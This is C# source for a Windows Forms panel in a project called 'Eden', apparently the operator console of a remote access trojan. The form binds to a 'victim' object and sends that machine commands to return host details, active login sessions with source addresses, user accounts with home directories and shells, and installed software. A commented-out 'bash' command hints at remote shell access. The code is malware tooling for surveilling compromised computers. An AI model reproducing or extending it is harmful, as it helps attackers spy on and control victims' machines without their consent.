using Microsoft.Web.WebView2.Core;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Linq.Expressions;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Eden
{
    public partial class frmInformation : Form
    {
        public clsVictim m_victim { get; init; }
        public string m_szVictimID { get { return m_victim.m_szID; } }
        private clsClient m_clnt { get { return m_victim.m_clnt; } }

        public frmInformation(clsVictim victim)
        {
            InitializeComponent();

            m_victim = victim;
            Text = $@"Information\\{victim.m_szID}";
        }

        void Received(clsClient clnt, string szVictimID, List<string> lsMsg)
        {
            if (szVictimID != m_szVictimID)
                return;

            if (lsMsg[0] == "info")
            {
                if (lsMsg[1] == "details")
                {
                    foreach (string szJson in clsTools.EZData.String2OneDList(lsMsg[2]))
                    {
                        Invoke(new Action(() =>
                        {
                            Dictionary<string, JsonElement> dic = clsTools.EZData.JsonStr2Dic(szJson);
                            foreach (string szKey in dic.Keys)
                            {
                                richTextBox1.AppendText($"{szKey}: {dic[szKey].ToString()}{Environment.NewLine}");
                            }

                            richTextBox1.AppendText($"{string.Concat(Enumerable.Repeat("-", 100))}{Environment.NewLine}");
                        }));
                    }

                    Invoke(() => toolStripStatusLabel1.Text = "Action successfully.");
                }
                else if (lsMsg[1] == "app")
                {
                    var ls2d = clsTools.EZData.String2TwoDList(lsMsg[2]);
                    foreach (var ls in ls2d)
                    {
                        ListViewItem item = new ListViewItem(ls.First());
                        for (int i = 1; i < ls.Count; i++)
                            item.SubItems.Add(ls[i]);

                        Invoke(() =>
                        {
                            listView2.Items.Add(item);
                        });
                    }

                    Invoke(() => toolStripStatusLabel4.Text = $"Action successfully. Session[{listView4.Items.Count}]");
                }
                else if (lsMsg[1] == "user")
                {
                    var ls2d = clsTools.EZData.String2TwoDList(lsMsg[2]);
                    foreach (var ls in ls2d)
                    {
                        ListViewItem item = new ListViewItem(ls.First());
                        for (int i = 1; i < ls.Count; i++)
                            item.SubItems.Add(ls[i]);

                        Invoke(() =>
                        {
                            listView1.Items.Add(item);
                        });
                    }

                    Invoke(() => toolStripStatusLabel3.Text = $"Action successfully. User[{listView1.Items.Count}]");
                }
                else if (lsMsg[1] == "session")
                {
                    var ls2d = clsTools.EZData.String2TwoDList(lsMsg[2]);
                    foreach (var ls in ls2d)
                    {
                        ListViewItem item = new ListViewItem(ls.First());
                        for (int i = 1; i < ls.Count; i++)
                            item.SubItems.Add(ls[i]);

                        Invoke(() =>
                        {
                            listView4.Items.Add(item);
                        });
                    }

                    Invoke(() => toolStripStatusLabel2.Text = $"Action successfully. Application[{listView2.Items.Count}]");
                }
            }
        }

        void fnInitDetails()
        {
            richTextBox1.Clear();
            toolStripStatusLabel1.Text = "Loading...";
            m_clnt.SendVictim(m_szVictimID, "Info|details");
        }
        void fnInitSession()
        {
            listView4.Items.Clear();
            toolStripStatusLabel2.Text = "Loading...";
            m_clnt.SendVictim(m_szVictimID, "Info|session");
        }
        void fnInitUser()
        {
            listView1.Items.Clear();
            toolStripStatusLabel3.Text = "Loading...";
            m_clnt.SendVictim(m_szVictimID, "Info|user");
        }
        void fnInitApp()
        {
            listView2.Items.Clear();
            toolStripStatusLabel4.Text = "Loading...";
            m_clnt.SendVictim(m_szVictimID, "Info|app");
        }

        void setup()
        {
            if (m_clnt == null)
            {
                MessageBox.Show("m_clnt is null.");
                Close();

                return;
            }

            m_clnt.ServerMessageReceived += Received;

            StartPosition = FormStartPosition.CenterScreen;
            richTextBox1.Text = string.Empty;

            listView1.View = View.Details;
            listView1.FullRowSelect = true;
            listView1.Columns.Add("Username", 120);
            listView1.Columns.Add("Uid", 80);
            listView1.Columns.Add("Gid", 80);
            listView1.Columns.Add("Full name", 150);
            listView1.Columns.Add("Home Directory", 200);
            listView1.Columns.Add("Shell", 150);

            listView4.View = View.Details;
            listView4.FullRowSelect = true;
            listView4.Columns.Add("Username", 150);
            listView4.Columns.Add("Terminal", 120);
            listView4.Columns.Add("Login Time", 120);
            listView4.Columns.Add("From", 120);

            listView2.View = View.Details;
            listView2.FullRowSelect = true;
            listView2.Columns.Add("Name", 120);
            listView2.Columns.Add("Version", 120);
            listView2.Columns.Add("Source", 120);
            listView2.Columns.Add("Install Path", 150);
            listView2.Columns.Add("Description", 200);
            listView2.Columns.Add("Size", 100);
            listView2.Columns.Add("Architecture", 80);
            listView2.Columns.Add("License", 100);

            toolStripStatusLabel1.Text = string.Empty;
            toolStripStatusLabel2.Text = string.Empty;
            toolStripStatusLabel3.Text = string.Empty;
            toolStripStatusLabel4.Text = string.Empty;

            //m_clnt.SendVictim(m_szVictimID, "Info|bash");

            fnInitDetails();
            fnInitSession();
            fnInitUser();
            //fnInitApp();
        }

        private void frmInformation_Load(object sender, EventArgs e)
        {
            setup();
        }

        private void frmInformation_FormClosed(object sender, FormClosedEventArgs e)
        {
            m_clnt.ServerMessageReceived -= Received;
        }

        private void tabControl1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Modifiers == Keys.Control)
            {

            }
            else
            {
                if (e.KeyCode == Keys.F5)
                {
                    switch (tabControl1.SelectedIndex)
                    {
                        case 0:
                            fnInitDetails();
                            break;
                        case 1:
                            fnInitSession();
                            break;
                        case 2:
                            fnInitUser();
                            break;
                        case 3:
                            fnInitApp();
                            break;
                    }
                }
            }
        }

        private void toolStripButton1_Click(object sender, EventArgs e)
        {
            fnInitDetails();
        }

        private void toolStripButton2_Click(object sender, EventArgs e)
        {
            fnInitSession();
        }

        private void toolStripButton3_Click(object sender, EventArgs e)
        {
            fnInitUser();
        }

        private void toolStripButton4_Click(object sender, EventArgs e)
        {
            DialogResult dr = MessageBox.Show(
                "The command of this feature does not sent automatically since it might lead performance problem.\n" +
                "Are you sure to continue?",
                "Warning",
                MessageBoxButtons.YesNo,
                MessageBoxIcon.Warning,
                MessageBoxDefaultButton.Button2
            );

            if (dr != DialogResult.Yes)
                return;

            fnInitApp();
        }
    }
}
